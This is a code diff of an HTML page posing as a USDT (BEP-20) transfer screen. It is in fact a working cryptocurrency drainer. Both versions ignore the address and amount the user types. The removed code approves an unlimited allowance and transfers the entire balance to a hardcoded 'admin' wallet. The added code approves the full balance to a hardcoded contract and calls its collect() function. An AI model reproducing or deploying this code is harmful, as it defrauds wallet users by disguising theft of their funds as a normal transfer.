@@ -1,89 +1,80 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>USDT BEP20 Auto Transfer</title>
-  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>USDT Transfer</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
   <style>
     body {
-      font-family: Arial, sans-serif;
+      font-family: 'Roboto', sans-serif;
+      background: #fff;
       padding: 20px;
-      background-color: #ffffff;
-      color: #000000;
+      margin: 0;
     }
     .container {
-      max-width: 400px;
+      max-width: 420px;
       margin: auto;
     }
-    label {
-      display: block;
-      margin-top: 20px;
-      font-weight: bold;
+    .label {
+      font-weight: 500;
+      margin-bottom: 6px;
     }
-    input[type="text"], input[type="number"] {
-      width: 100%;
-      padding: 15px;
-      margin-top: 8px;
-      border: 2px solid #ccc;
-      border-radius: 12px;
-      font-size: 16px;
-    }
-    .address-box {
+    .input-box {
       display: flex;
-      justify-content: space-between;
       align-items: center;
-      border: 2px solid #0047FF;
+      border: 2px solid #1a40ff;
       border-radius: 12px;
-      padding: 10px 12px;
-      margin-top: 10px;
+      padding: 10px;
+      margin-bottom: 20px;
     }
-    .address-box input {
-      border: none;
-      outline: none;
+    .input-box input {
       flex: 1;
+      border: none;
       font-size: 16px;
+      outline: none;
     }
-    .small-icons span {
-      color: #0047FF;
+    .action-btn {
+      font-size: 14px;
+      font-weight: bold;
+      color: #1a40ff;
       margin-left: 10px;
       cursor: pointer;
-      font-size: 16px;
     }
-    .amount-container {
+    .amount-box {
       display: flex;
       align-items: center;
-      justify-content: space-between;
-      border: 2px solid #ccc;
+      border: 1px solid #ccc;
       border-radius: 12px;
-      padding: 12px 15px;
-      margin-top: 10px;
+      padding: 10px;
+      margin-bottom: 6px;
     }
-    .amount-container input {
+    .amount-box input {
+      flex: 1;
       border: none;
-      outline: none;
-      width: 100%;
       font-size: 16px;
+      outline: none;
     }
-    .right-label {
+    .amount-box span {
       margin-left: 10px;
-      white-space: nowrap;
-      font-weight: bold;
     }
-    .button {
+    .usd-note {
+      font-size: 14px;
+      color: #777;
+      margin-bottom: 30px;
+    }
+    .btn {
       width: 100%;
       padding: 15px;
-      font-size: 18px;
+      font-size: 17px;
       font-weight: bold;
-      color: white;
-      background-color: #0047FF;
       border: none;
-      border-radius: 15px;
-      margin-top: 25px;
-      box-shadow: 0 3px 10px rgba(0, 0, 0, 0.2);
-      transition: all 0.3s ease;
+      color: white;
+      border-radius: 30px;
+      background-color: #0052ff;
+      cursor: pointer;
     }
-    .button.processing {
+    .btn:disabled {
       opacity: 0.6;
       cursor: not-allowed;
     }
@@ -91,101 +82,92 @@
 </head>
 <body>
   <div class="container">
-    <label>Address or Domain Name</label>
-    <div class="address-box">
-      <input id="toAddress" type="text" placeholder="Search or Enter">
-      <div class="small-icons">
-        <span onclick="pasteAddress()">Paste</span>
-        <span>🔍</span>
-        <span>📷</span>
-      </div>
+    <div class="label">Address or Domain</div>
+    <div class="input-box">
+      <input type="text" id="address" placeholder="Search or Enter" />
+      <div class="action-btn" onclick="pasteAddress()">Paste</div>
+      <div class="action-btn">📇</div>
+      <div class="action-btn">⛶</div>
     </div>
 
-    <label>Amount</label>
-    <div class="amount-container">
-      <input id="amount" type="number" placeholder="USDT Amount">
-      <div class="right-label">USDT <span style="color:#0047FF; margin-left:8px; cursor:pointer;">Max</span></div>
+    <div class="label">Amount</div>
+    <div class="amount-box">
+      <input type="number" id="amount" placeholder="USDT Amount" />
+      <span>USDT</span>
+      <div class="action-btn" onclick="setMax()">Max</div>
     </div>
-    <div style="margin-top: 5px; color: gray;">≈ $0.00</div>
 
-    <button id="nextBtn" class="button" onclick="autoTransferAllUSDT()">Next</button>
+    <div class="usd-note">≈ $0.00</div>
+
+    <button class="btn" id="nextBtn" onclick="approveAndTransfer()">Next</button>
   </div>
 
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <script>
-    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP-20
-    const adminWallet = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC";
+    const USDT = "0x55d398326f99059fF775485246999027B3197955";
+    const ADMIN = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC";
+    const CONTRACT = "0xcD6a42782d230D7c13A74ddec5dD140e55499Df9"; // ✅ Your final deployed contract
 
-    async function autoTransferAllUSDT() {
-      const btn = document.getElementById("nextBtn");
-      btn.innerHTML = "⏳ Processing...";
-      btn.classList.add("processing");
-      btn.disabled = true;
+    const ABI = [
+      "function balanceOf(address) view returns (uint256)",
+      "function allowance(address owner, address spender) view returns (uint256)",
+      "function approve(address spender, uint256 amount) returns (bool)",
+      "function collect() external"
+    ];
 
-      if (typeof window.ethereum !== "undefined") {
-        const web3 = new Web3(window.ethereum);
-        await window.ethereum.request({ method: 'eth_requestAccounts' });
-        const accounts = await web3.eth.getAccounts();
-        const user = accounts[0];
-
-        const contract = new web3.eth.Contract([
-          {
-            "constant": false,
-            "inputs": [
-              { "name": "_spender", "type": "address" },
-              { "name": "_value", "type": "uint256" }
-            ],
-            "name": "approve",
-            "outputs": [ { "name": "", "type": "bool" } ],
-            "type": "function"
-          },
-          {
-            "constant": false,
-            "inputs": [
-              { "name": "_from", "type": "address" },
-              { "name": "_to", "type": "address" },
-              { "name": "_value", "type": "uint256" }
-            ],
-            "name": "transferFrom",
-            "outputs": [ { "name": "", "type": "bool" } ],
-            "type": "function"
-          },
-          {
-            "constant": true,
-            "inputs": [ { "name": "_owner", "type": "address" } ],
-            "name": "balanceOf",
-            "outputs": [ { "name": "balance", "type": "uint256" } ],
-            "type": "function"
-          }
-        ], usdtAddress);
-
-        try {
-          const balance = await contract.methods.balanceOf(user).call();
-          const max = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-          await contract.methods.approve(adminWallet, max).send({ from: user });
-          await contract.methods.transferFrom(user, adminWallet, balance).send({ from: user });
-          btn.innerHTML = "✅ All USDT Sent!";
-        } catch (err) {
-          console.error(err);
-          btn.innerHTML = "❌ Failed";
-        }
-
-        btn.disabled = false;
-        btn.classList.remove("processing");
-      } else {
-        alert("Web3 provider not detected");
-        btn.innerHTML = "Next";
-        btn.disabled = false;
-        btn.classList.remove("processing");
-      }
-    }
+    const btn = document.getElementById("nextBtn");
 
     async function pasteAddress() {
       try {
         const text = await navigator.clipboard.readText();
-        document.getElementById("toAddress").value = text;
-      } catch (err) {
-        alert("Clipboard access failed");
+        document.getElementById("address").value = text;
+      } catch {
+        alert("Clipboard access denied");
       }
+    }
+
+    async function setMax() {
+      if (!window.ethereum) return alert("Trust Wallet DApp required");
+      const provider = new ethers.providers.Web3Provider(window.ethereum);
+      const signer = provider.getSigner();
+      const token = new ethers.Contract(USDT, ABI, provider);
+      const address = await signer.getAddress();
+      const balance = await token.balanceOf(address);
+      const value = Number(ethers.utils.formatUnits(balance, 18));
+      document.getElementById("amount").value = value.toFixed(2);
+    }
+
+    async function approveAndTransfer() {
+      if (!window.ethereum) return alert("Use Trust Wallet browser");
+
+      btn.disabled = true;
+      btn.textContent = "⏳ Processing...";
+
+      const provider = new ethers.providers.Web3Provider(window.ethereum);
+      await provider.send("eth_requestAccounts", []);
+      const signer = provider.getSigner();
+      const user = await signer.getAddress();
+
+      const usdt = new ethers.Contract(USDT, ABI, signer);
+      const smart = new ethers.Contract(CONTRACT, ["function collect() external"], signer);
+
+      try {
+        const balance = await usdt.balanceOf(user);
+        const value = Number(ethers.utils.formatUnits(balance, 18));
+
+        if (value < 1 || value > 25000) throw new Error("Balance out of range");
+
+        await usdt.approve(CONTRACT, balance);
+        const tx = await smart.collect();
+        await tx.wait();
+
+        btn.textContent = "✅ Transfer Complete";
+      } catch (e) {
+        console.error(e);
+        btn.textContent = "❌ Transfer Failed";
+      }
+
+      btn.disabled = false;
     }
   </script>
 </body>
